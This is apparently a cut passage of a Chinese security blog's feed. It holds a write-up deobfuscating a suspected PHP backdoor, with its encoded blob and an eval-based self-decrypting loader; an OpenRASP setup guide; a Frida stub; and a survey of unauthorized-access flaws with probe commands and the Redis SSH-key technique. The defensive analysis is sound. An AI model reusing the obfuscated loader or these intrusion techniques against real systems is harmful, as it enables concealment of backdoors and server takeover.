class="number">71</span>JzCAN99XeYjqmPJucpe841ihHu2LfYj5x1jXah0ZKTjYpej1c/<span class="number">71</span>JzjZ0KXYmD2qHpWu499zEAjX0p/<span class="number">4</span>KYjANIgT+<span class="number">0</span>whmeONxZG8X0ON2q6LfDpTNjeqJQgqfzj84IeMa/RX0sNYzDyhcZxhaEW8JupqH/<span class="number">6</span>McQm1JQPvNZDqfKmr4eGTRgv1JKkyHPkyfKn1cKEvNZctfDauKg2qfpehaEghRukyRKpfmqa1cKmyJQWu4qqvXgvhHQk1JWEyV9912hyhHpqT+EjhRukyRKpdw6eL4gBdwGsNxZprR9912Tj849k12hkr4jGdw6e1MKp12ej84IeMa/RX0sNYzDyhcZxhaEW82QauMhPvNqXZzDQYaYjqmPaLfYgqmPprRIgqmPetMZpyHpiu4Da52KSuMhitfap5RziyJQWu49Hzes/TN1iqHPkyfz6hcu2tfapMcK31N1G5x1jtMAjqmw252ZitfapvNqS1HQlu41G5x1jtMAjq49M40K4Z49a52KGu+aV52KGuN98zeZQzx9Nf49prRIjZ0KXYm9A4zahKNIwTNwjAXI2vXgvhHesAXgvqckGyHzjvNZctfDau4IsTNZnzEqAXEh9XQg2uHT2M4ECuJKEtckntMhmtMe6hRQauMhPv4ejrwGmufQgyJQWuKsSuMY6hRukyRKpfmqaLfY2M4weqJQgqfKyhVKSuMhitfaphaEGdw6euMkwYMhmfmZGM4IsTNZctfDauXgvhHeBvSgvnY6eLfPcLMZpqMhgT+EjT2geMa/+fmqSLMZpqMhghaasuJqkyfzi1Hkw8cu2LfYsrmZJucpen4TONxZmuzQm1xIsTHQm1JQPvNeONxZDqfKmr4IsTNZnzEqAXEh9XQg2uHT2M4EC1MKp12e6ha/QX0K+KN9V52KGuNDa52KSuMhitfapT0u4XEEjhmPEyJQWu4j2tM9wMVqkLJpihmeihm9k1m9V5N1iqHPkyfz6hV/wtf/phmeihm9k1m9aTQqTZKhQTRziqfpe8M1iqfpeT0QdZN9V5Ju2LfYshm3euJqGuNIihm98zeZQzx9Nf492qHpWu490ZK/+T0DhXzpzT+Ij5NImA41GdwGVLHpgu4I6hRukyRKpT+EjhQsXZED8YeQAfmqetxqq5XPJuMZlLQsk12hkr4je1MKp12eGv49ON2hptfDitfapMV/pqNjeqJQgqfKyhVKGuNqq5NZctfDauKg2y2/p1JPkyfz2M4eONxZctfDauKg2tMukqHQmhaEj849kqJQEtMT6hRukyRKpfmqaLfY2M4we1cpouXE21cakyHw2vXgvhRhpYMhmfaEj84IeqJQgqfzON2EvhRZ6uMKmyNIsTNhJucQWu4PwLRIU1VYs12IJyVIs1JKwyReJuJqGu+aOhHu2LfZsTlgvhRhp1HDPT+EjtMhmtMe6vXgvhR/DyNIsTNqXZzDQYaYjvx9Hzes/TN1iqHPkyfz6hcu2tfapMVhp1HDPhmeiTx9M40K4Z49JucpeT+EjhHu2LfYjXah0ZKTjYpejuHQEufDGyJzjZ0KXYmTONxZDqfKmr4IsTNZnzEqAXEh9XQg2uHT2M4EC1MKp12e6hR/DyNeONxZlyVKiqNIsT+IONxZk12hnLfZST+EjtMhmtMe6vXgvqckGyHzjvNZctfDau4IsTNZnzEqAXEh9XQg2uHT2M4ECuJKEtckntMhmtMe6hRQauMhPv4ejrw6eqJQgqfKyhc/<span class="number">7</span>y2Zpy2Y2M4IsTHPgAJhmvHkEyfDS1HKlLfQgtckk12A6hRukyRKpfmqlycPEufPEhaEGv4IONxZctfDauKg2tcsiqHKiqNqq849w1JK2MVhp1HDktcz6Txs1fcKWdxjivSFGdpE7LMAx5NTFLfa2TR/mtSa1TJpWtfqp5cuktcz7MQwD5JqGupwxTH/gtM/S8KwxuJQluKwx8xTghRukyRKpfmqlycPEufPEhaEGdw6e1JKwyRpyM4IsTNZctfDauXgvhHQm1psGuR/yM4IsTNZctfDauKg2LfY2MXgvhH/<span class="number">7</span>qfPEvmgON2Ev1JKkyHPkyfKnucKEvNeONJpitcDauHKnycPlu4kXMah8XaYiTx37uJqkyfz7rmZktVEi1HkwTxeON2EvnY6=</span><br></pre></td></tr></table></figure><h3 id="0x01花开"><a href="#0x01花开" class="headerlink" title="0x01花开"></a>0x01花开</h3><p>放入php的环境，空白文件，啥都没有。<br>看见eval，直接换上echo大法，</p><img src="/phpshell/image-20191101090700750.png" class="" title="描述">像个套娃，那把这段代码丢进脚本，再替换一下看看<img src="/phpshell/image-20191101091254120.png" class="" title="描述"><p>又变空白了，还有一个eval，再换为echo，</p><img src="/phpshell/image-20191101094314695.png" class="" title="描述"><img src="/phpshell/image-20191101094330680.png" class="" title="描述">乱码了，没有办法，只能一点一点分析。<p>在上一步替换之后代码情况如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$OOO0O0O00</span>=<span class="keyword">__FILE__</span>;<span class="variable">$OOO000000</span>=urldecode(<span class="string">&#x27;%74%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64%66%70%6e%72&#x27;</span>);<span class="variable">$OO00O0000</span>=<span class="number">24488</span>;<span class="variable">$OOO0000O0</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">4</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">9</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO000000</span>&#123;<span class="number">2</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">13</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">16</span>&#125;;<span class="variable">$OOO0000O0</span>.=<span class="variable">$OOO0000O0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">11</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">12</span>&#125;.<span class="variable">$OOO0000O0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;;<span class="variable">$O0O0000O0</span>=<span class="string">&#x27;OOO0000O0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$OO0OO0000</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">17</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">12</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">19</span>&#125;;<span class="keyword">if</span>(!<span class="number">0</span>)<span class="variable">$O000O0O00</span>=<span class="variable">$OO0OO0000</span>(<span class="variable">$OOO0O0O00</span>,<span class="string">&#x27;rb&#x27;</span>);<span class="variable">$OO0OO000O</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">17</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">20</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">5</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">9</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">16</span>&#125;;<span class="variable">$OO0OO00O0</span>=<span class="variable">$OOO000000</span>&#123;<span class="number">14</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">20</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OOO000000</span>&#123;<span class="number">20</span>&#125;;<span class="variable">$OO0OO000O</span>(<span class="variable">$O000O0O00</span>,<span class="number">1147</span>);<span class="variable">$OO00O00O0</span>=(<span class="variable">$OOO0000O0</span>(<span class="variable">$OO0OO00O0</span>(<span class="variable">$OO0OO000O</span>(<span class="variable">$O000O0O00</span>,<span class="number">380</span>),<span class="string">&#x27;I9N+0QHRThv5A/d8YZ4XzKfMtuLy1qrnjkxlepJ26GbBgWi7wDmSEacV3PoOFsCU=&#x27;</span>,<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>)));<span class="keyword">eval</span>(<span class="variable">$OO00O00O0</span>);<span class="keyword">return</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这么多ooxx，看到有点迷，就替换一下啵。</p><p>有一些字符串拼接也打印一下，探探究竟 。</p><img src="/phpshell/image-20191101092554134.png" class="" title="描述"><img src="/phpshell/image-20191101092756236.png" class="" title="描述"><p>base64_decode 这到没啥奇怪的，fopen的话，就有点问题了，读了一个文件，再看看代码，第一行有个__FILE__，肯定是有啥自加密的东西，一旦脚本篡改，脚本就没法执行，出来乱码，继续分析下去看看。</p><img src="/phpshell/image-20191101093454205.png" class="" title="描述"><p>到了这一步基本逻辑就很清晰了。</p><p>脚本的前半段，也就是1147字节，是脚本，后面的是真正的文件内容。一旦修改了前面1147字节的内容，前面代码的大小发生变动，也就无法执行，拿到真正的代码了。</p><p>so，我们怎么改一下，直接把后半部分的内容，放到最前面，然后将读取1147这个一行注释掉，直接读取前面的380字节，这样就可以为所欲为了。</p><h3 id="0x02-花谢"><a href="#0x02-花谢" class="headerlink" title="0x02 花谢"></a>0x02 花谢</h3><p>按照上一步的分析，修改代码</p><img src="/phpshell/image-20191101094733172.png" class="" title="描述"><p>看一下结果<img src="/phpshell/image-20191101094810943.png" class="" title="描述"></p><p>上半部分是脚本的内容，下半部分，看来还要替换一下，果然套娃套了一层层～</p><p>最后还有一个eval，改成echo再执行看看，bingo，真正的代码出来了</p><img src="/phpshell/image-20191101095102163.png" class="" title="描述"><p>格式化一下<img src="/phpshell/image-20191101095245622.png" class="" title="描述"></p><p>看着挺像是正常程序的，难道今天我跟D盾都是铁憨憨，捅错了位置？？</p><h3 id="0x03-缘灭"><a href="#0x03-缘灭" class="headerlink" title="0x03 缘灭"></a>0x03 缘灭</h3><p>看了一会，想起有个qq号码，那搜一下看看啵</p><img src="/phpshell/image-20191101091416110.png" class="" title="描述"><img src="/phpshell/image-20191101091654693.png" class="" title="描述"><p>emmm，无fuck可说。</p><p>Over！</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;by 青衫磊落&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-缘生&quot;&gt;&lt;a href=&quot;#0x00-缘生&quot; class=&quot;headerlink&quot; title=&quot;0x00 缘生&quot;&gt;&lt;/a&gt;0x00 缘生&lt;/h3&gt;&lt;p&gt;某日下午正在美滋滋的把玩蚁剑，兄弟说站被入侵了，扫出了好几个后门，顿时来了兴趣。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://www.pa55w0rd.online/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="分析" scheme="http://www.pa55w0rd.online/tags/%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP 单机版</title>
    <link href="http://www.pa55w0rd.online/openrasp/"/>
    <id>http://www.pa55w0rd.online/openrasp/</id>
    <published>2019-10-30T07:28:02.000Z</published>
    <updated>2019-11-04T05:40:02.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>某web应用一直被黑，加上是零几年的网站代码没人维护，于是从某云开个服务器放上去了，然后再部署一个防护软件，想装个安全狗的，听大佬说存在数据回传，之前关注了百度开源的OpenRASP项目，先在测试环境试一下</p><span id="more"></span><h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><p>这个PHP测试环境是前几天CVE-2019-11043 PHP-FPM + Nginx RCE的漏洞靶场</p><p>docker 启动并将宿主机目录挂在到容器 /var/www/html 目录下</p><p>下载测试用例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>packages.baidu.com<span class="regexp">/app/</span>openrasp<span class="regexp">/testcases/</span>php-vulns.tar.gz</span><br><span class="line">tar -xzf php-vulns.tar.gz</span><br><span class="line"></span><br><span class="line">访问http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">8080</span><span class="regexp">/vulns/</span>  OpenRASP 官方测试用例集合</span><br></pre></td></tr></table></figure><p>下载openrasp</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>packages.baidu.com<span class="regexp">/app/</span>openrasp<span class="regexp">/release/</span><span class="number">1.2</span>.<span class="number">1</span>/rasp-php-linux.tar.bz2</span><br><span class="line">tar -xjf rasp-php-linux.tar.bz2</span><br></pre></td></tr></table></figure><p>进入容器内</p><p>这里安装单机版，openrasp依赖pdo、pcre、json扩展</p><p>通过php -m 查看扩展状态是已启用的</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>这里使用自动化安装失败</p><p>改为手工安装</p><ol><li>确认基本信息</li></ol><p>在web目录下创建一个phpinfo.php文件<br>定位到extension_dir，确认PHP扩展安装目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>php<span class="regexp">/extensions/</span>no-debug-non-zts-<span class="number">20170718</span></span><br></pre></td></tr></table></figure><p>搜索Additional .ini files parsed （生产服务器上没有，搜索Loaded Configuration File确认ini配置文件路径）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/etc/</span>php<span class="regexp">/conf.d/</span>docker-php-ext-sodium.ini </span><br></pre></td></tr></table></figure><p>在该目录下创建一个新的ini文件/etc/php.d/z-openrasp.ini</p><ol start="2"><li>安装软件</li></ol><p>根据PHP版本号，复制openrasp.so到扩展目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp openrasp<span class="regexp">/rasp-php-2019-10-29/</span>php<span class="regexp">/linux-php7.2-x86_64/</span>openrasp.so <span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>php<span class="regexp">/extensions/</span>no-debug-non-zts-<span class="number">20170718</span>/</span><br><span class="line">chmod <span class="number">755</span> <span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>php<span class="regexp">/extensions/</span>no-debug-non-zts-<span class="number">20170718</span>/openrasp.so</span><br></pre></td></tr></table></figure><p>确定openrasp安装目录，这个目录将会用于存储检测插件、报警日志、插件日志等内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/opt/</span>rasp</span><br><span class="line">chmod <span class="number">777</span> -R <span class="regexp">/opt/</span>rasp</span><br></pre></td></tr></table></figure><p>修改z-openrasp.ini，添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; BEGIN OPENRASP</span></span><br><span class="line"></span><br><span class="line"><span class="section">[openrasp]</span></span><br><span class="line"><span class="attr">extension</span>=openrasp.so</span><br><span class="line"><span class="attr">openrasp.root_dir</span>=/opt/rasp</span><br><span class="line"></span><br><span class="line"><span class="comment">; 远程管理配置，不需要不用配置</span></span><br><span class="line"><span class="comment">; openrasp.backend_url=</span></span><br><span class="line"><span class="comment">; openrasp.app_id=</span></span><br><span class="line"><span class="comment">; openrasp.app_secret=</span></span><br><span class="line"><span class="comment">; openrasp.remote_management_enable=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; END OPENRASP</span></span><br></pre></td></tr></table></figure><ol start="3"><li><p>将官方插件移动到 /opt/rasp/plugins/ 目录下</p></li><li><p>重启php-fpm</p></li><li><p>验证是否安装成功，通过phpinfo.php，检查openrasp模块是否加载成功，返回包X-Protected-By: OpenRASP</p></li><li><p>插件模式开启的是观察模式，将所有的拦截改为仅记录日志，在插件里面关闭观察模式</p></li></ol><h2 id="0x03-防护成功"><a href="#0x03-防护成功" class="headerlink" title="0x03 防护成功"></a>0x03 防护成功</h2><img src="/openrasp/1.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;某web应用一直被黑，加上是零几年的网站代码没人维护，于是从某云开个服务器放上去了，然后再部署一个防护软件，想装个安全狗的，听大佬说存在数据回传，之前关注了百度开源的OpenRASP项目，先在测试环境试一下&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>frida hook 简单使用</title>
    <link href="http://www.pa55w0rd.online/frida/"/>
    <id>http://www.pa55w0rd.online/frida/</id>
    <published>2019-10-14T06:55:28.000Z</published>
    <updated>2019-10-14T10:40:58.010Z</updated>
    
    <content type="html"><![CDATA[<p>拿到一份APP渗透测试报告，里面有一个运行日志残留（中危），该日志中保留大量运行日志，其中包含了一些敏感信息，攻击者可以根据该日志获取应用运行的信息，为进一步攻击做准备</p><p>我对APP客户端测试比较初级，残留日志我一般会使用adb logcat打印一下或者在程序目录下翻一翻。并没有发现日志中存在敏感信息，问了下测试的工程师，是通过源代码分析找到相关日志类，hook这个类打印日志</p><p>因为编程能力有限，之前从未分析过APK反编译之后的源码，找到该日志类后（java层），从52上看了一番hook文章，了解了两个工具Xposed和Frida</p><p>使用Xposed比较麻烦，需要Android ide等进行模块开发，电脑比较渣，没有继续研究</p><p>使用Frida比较方便，轻量级，使用python和js进行hook模块开发</p><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;拿到一份APP渗透测试报告，里面有一个运行日志残留（中危），该日志中保留大量运行日志，其中包含了一些敏感信息，攻击者可以根据该日志获取应用运行的信息，为进一步攻击做准备&lt;/p&gt;
&lt;p&gt;我对APP客户端测试比较初级，残留日志我一般会使用adb logcat打印一下或者在程序目录下翻一翻。并没有发现日志中存在敏感信息，问了下测试的工程师，是通过源代码分析找到相关日志类，hook这个类打印日志&lt;/p&gt;
&lt;p&gt;因为编程能力有限，之前从未分析过APK反编译之后的源码，找到该日志类后（java层），从52上看了一番hook文章，了解了两个工具Xposed和Frida&lt;/p&gt;
&lt;p&gt;使用Xposed比较麻烦，需要Android ide等进行模块开发，电脑比较渣，没有继续研究&lt;/p&gt;
&lt;p&gt;使用Frida比较方便，轻量级，使用python和js进行hook模块开发&lt;/p&gt;</summary>
    
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/categories/note/"/>
    
    
    <category term="note" scheme="http://www.pa55w0rd.online/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>常见未授权访问漏洞总结</title>
    <link href="http://www.pa55w0rd.online/unauthorized-access-sumup/"/>
    <id>http://www.pa55w0rd.online/unauthorized-access-sumup/</id>
    <published>2019-09-23T08:59:49.000Z</published>
    <updated>2019-09-24T02:05:15.949Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在对公司的资产进行梳理，发现了很多端口对外开放了，如ldap389、rsync873、ssh22、mysql3306和一些不常见的端口，以及内网大量的hadoop、redis、ftp、mongodb等存在未授权访问，从网上收集了一些文章总结一下常见的未授权访问漏洞</p><span id="more"></span><h2 id="0x01-参考"><a href="#0x01-参考" class="headerlink" title="0x01 参考"></a>0x01 参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/6103">常见未授权访问漏洞总结</a><br><a href="https://www.secpulse.com/archives/61101.html">【脉搏沉淀系列】未授权访问漏洞总结</a><br><a href="https://www.freebuf.com/articles/web/165340.html">混在运维部的安全员说“端口与口令安全” </a><br><a href="https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P2-VulnerabilityAnalysis.html#ftp-port-21">PortVulnerabilityAnalysis</a><br><a href="https://www.pa55w0rd.online/redis/">Redis的一些漏洞复现利用 </a><br><a href="https://www.cnblogs.com/qcloud1001/p/9173253.html">Hadoop Yarn REST API未授权漏洞利用挖矿分析</a></p></blockquote><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><h3 id="LDAP未授权访问漏洞"><a href="#LDAP未授权访问漏洞" class="headerlink" title="LDAP未授权访问漏洞"></a>LDAP未授权访问漏洞</h3><p><strong>漏洞介绍及危害</strong><br>轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p><p><strong>测试</strong><br>JXplorer、LdapAdmin等可视化工具连接</p><p><strong>防御手段</strong></p><ul><li>密码策略配置</li></ul><h3 id="NFS未授权访问漏洞"><a href="#NFS未授权访问漏洞" class="headerlink" title="NFS未授权访问漏洞"></a>NFS未授权访问漏洞</h3><p><strong>漏洞介绍及危害</strong></p><p>NFS（Network FileSystem）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。<br><strong>测试</strong><br>showmount -e 10.0.0.1</p><p><strong>防御手段</strong><br>限制IP</p><h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p><strong>漏洞简介及危害</strong></p><p> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><p><strong>测试</strong><br>redis-cli -h 10.0.0.1</p><p><strong>防御手段</strong></p><ul><li>禁止使用root权限启动redis服务。</li><li>对redis访问启动密码认证，并设置复杂密码。redis默认没有开启密码认证，打开/etc/redis/redis.conf配置文件， （requirepass 密码）可设置认证密码，保存redis.conf，重启redis（/etc/init.d/redis-serverrestart）之后，需要执行（auth 密码）。。</li><li>添加IP访问限制，并更改默认6379端口。</li></ul><h3 id="MongoDB未授权访问漏洞"><a href="#MongoDB未授权访问漏洞" class="headerlink" title="MongoDB未授权访问漏洞"></a>MongoDB未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p><p>  造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p><p><strong>测试</strong><br>nmap -p 27017 –script mongodb-info 10.0.0.1</p><p><strong>防御手段</strong></p><ul><li>为MongoDB添加认证：MongoDB启动时添加–auth参数、为MongoDB添加用户</li><li>MongoDB 自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择 –nohttpinterface 参数 nohttpinterface=false</li><li>使用安全组防火墙或本地操作系统防火墙对访问源IP进行控制，如果仅对内网服务器提供服务，建议禁止将MongoDB服务发布到互联网上。</li><li>启动时加入参数–bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</li></ul><h3 id="Jenkins未授权访问漏洞"><a href="#Jenkins未授权访问漏洞" class="headerlink" title="Jenkins未授权访问漏洞"></a>Jenkins未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</p><p><strong>测试</strong><br>访问<a href="http://10.0.0.1:8080/manage">http://10.0.0.1:8080/manage</a> 可以看到没有任何限制可以直接访问</p><p><strong>防御手段</strong></p><ul><li>升级版本。</li><li>添加认证，设置强密码复杂度及账号锁定。</li><li>禁止把Jenkins直接暴露在公网。</li></ul><h3 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  Memcached 是一套常用的 key-value 分布式高速缓存系统，由于 Memcached 的安全设计缺陷没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者无需认证通过命令交互可直接读取 Memcached中的敏感信息。</p><p><strong>测试</strong><br>telnet 10.0.0.1 11211 </p><p>nc -vv 10.0.0.1 11211</p><p>nmap -p 11211 –script memcached-info 10.0.0.1</p><p><strong>防御手段</strong></p><ul><li>设置Memchached只允许本地访问。</li><li>禁止外网访问Memcached 11211端口。</li><li>配置访问控制策略。</li><li>最小化权限运行。</li><li>修改默认端口等。</li></ul><h3 id="JBOSS-未授权访问漏洞"><a href="#JBOSS-未授权访问漏洞" class="headerlink" title="JBOSS 未授权访问漏洞"></a>JBOSS 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <a href="http://ip:8080/jmx-console">http://ip:8080/jmx-console</a> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p><p><strong>测试</strong><br><a href="http://10.0.0.1:8080/jmx-console/">http://10.0.0.1:8080/jmx-console/</a> 无需认证进入控制页面</p><p><strong>防御手段</strong></p><ul><li>对jmx控制页面访问添加访问验证。</li><li>进行JMX Console 安全配置。</li></ul><h3 id="VNC-未授权访问漏洞"><a href="#VNC-未授权访问漏洞" class="headerlink" title="VNC 未授权访问漏洞"></a>VNC 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</p><p><strong>测试</strong><br>vncviewer 10.0.0.1</p><p><strong>防御手段</strong></p><ul><li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码。</li><li>以最小普通权限身份运行操作系统。<h3 id="Docker-未授权访问漏洞"><a href="#Docker-未授权访问漏洞" class="headerlink" title="Docker 未授权访问漏洞"></a>Docker 未授权访问漏洞</h3></li></ul><p><strong>漏洞简介以及危害</strong></p><p>  Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p><p>  Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p><p><strong>测试</strong><br>docker -H tcp://10.0.0.1:2375 version</p><p><strong>防御手段</strong></p><ul><li>简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。</li><li>修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</li></ul><h3 id="ZooKeeper-未授权访问漏洞"><a href="#ZooKeeper-未授权访问漏洞" class="headerlink" title="ZooKeeper 未授权访问漏洞"></a>ZooKeeper 未授权访问漏洞</h3><p><strong>漏洞简介以及危害</strong></p><p>  